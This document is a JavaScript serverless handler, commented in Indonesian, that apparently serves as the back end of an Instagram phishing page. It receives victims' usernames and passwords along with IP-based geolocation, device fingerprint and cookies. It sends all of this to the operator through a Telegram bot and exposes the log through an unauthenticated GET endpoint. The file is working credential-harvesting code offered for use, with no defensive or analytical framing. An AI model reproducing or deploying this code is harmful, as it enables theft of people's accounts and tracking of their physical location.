let visits = [];

// Fungsi lookup lokasi dari IP pakai ip-api.com (gratis, tanpa API key)
async function lookupIP(ip) {
    // Skip kalau IP lokal/private
    if (!ip || ip === 'unknown' ||
        ip.startsWith('127.') ||
        ip.startsWith('10.') ||
        ip.startsWith('192.168.') ||
        ip.startsWith('172.') ||
        ip === '::1') {
        return null;
    }

    try {
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,mobile,query`, {
            method: 'GET'
        });
        const data = await res.json();

        if (data.status !== 'success') return null;

        return {
            country: data.country || '',
            countryCode: data.countryCode || '',
            region: data.regionName || '',
            city: data.city || '',
            zip: data.zip || '',
            lat: data.lat || '',
            lon: data.lon || '',
            timezone: data.timezone || '',
            isp: data.isp || '',
            org: data.org || '',
            asn: data.as || '',
            isProxy: data.proxy || false,
            isHosting: data.hosting || false,
            isMobile: data.mobile || false
        };
    } catch (err) {
        console.error('IP lookup failed:', err);
        return null;
    }
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    // GET — panel admin baca data
    if (req.method === 'GET') {
        return res.status(200).json({ visits: visits.slice(0, 200) });
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, password, fingerprint } = req.body || {};

    const ip =
        req.headers['x-forwarded-for']?.split(',')[0].trim() ||
        req.headers['x-real-ip'] ||
        req.socket?.remoteAddress ||
        'unknown';

    const userAgent = req.headers['user-agent'] || 'unknown';
    const referer   = req.headers['referer'] || 'direct';
    const timestamp = new Date().toISOString();

    // Lookup lokasi dari IP
    const geo = await lookupIP(ip);

    const entry = {
        username: username || '',
        password: password || '',
        ip,
        user_agent: userAgent,
        referer,
        timestamp,
        geo,
        screen:   fingerprint?.screen || '',
        language: fingerprint?.language || '',
        timezone: fingerprint?.timezone || '',
        platform: fingerprint?.platform || '',
        cores:    fingerprint?.cores || '',
        cookies:  fingerprint?.cookies || ''
    };

    visits.unshift(entry);
    if (visits.length > 500) visits = visits.slice(0, 500);

    // Kirim ke Telegram
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId   = process.env.TELEGRAM_CHAT_ID;

    if (botToken && chatId) {
        let message = '';
        if (username || password) {
            message += `🔥 INSTAGRAM LOGIN\n\n`;
            message += `Username: ${username || '-'}\n`;
            message += `Password: ${password || '-'}\n\n`;
        } else {
            message += `👁 NEW VISIT\n\n`;
        }

        message += `🌐 IP: ${ip}\n`;

        if (geo) {
            message += `📍 Location: ${geo.city}, ${geo.region}, ${geo.country}\n`;
            message += `📍 Coordinates: ${geo.lat}, ${geo.lon}\n`;
            message += `🏢 ISP: ${geo.isp}\n`;
            if (geo.org) message += `🏢 Org: ${geo.org}\n`;
            if (geo.asn) message += `📡 ASN: ${geo.asn}\n`;
            message += `🕐 Timezone: ${geo.timezone}\n`;

            // Warning kalau VPN/proxy/hosting
            if (geo.isProxy)   message += `⚠️ VPN/Proxy detected\n`;
            if (geo.isHosting) message += `⚠️ Hosting/Datacenter IP\n`;
            if (geo.isMobile)  message += `📱 Mobile network\n`;
        } else {
            message += `📍 Location: unavailable\n`;
        }

        message += `\n💻 Device\n`;
        message += `UA: ${userAgent.substring(0, 100)}\n`;
        message += `Referer: ${referer}\n`;

        if (fingerprint) {
            message += `\n📱 Fingerprint\n`;
            message += `Screen: ${fingerprint.screen || '-'}\n`;
            message += `Lang: ${fingerprint.language || '-'}\n`;
            message += `Timezone: ${fingerprint.timezone || '-'}\n`;
            message += `Platform: ${fingerprint.platform || '-'}\n`;
            if (fingerprint.cores) message += `Cores: ${fingerprint.cores}\n`;
        }

        message += `\n⏰ ${timestamp}`;

        try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    disable_web_page_preview: true
                })
            });
        } catch (err) {
            console.error('Telegram send failed:', err);
        }
    }

    return res.status(200).json({ status: 'ok' });
}
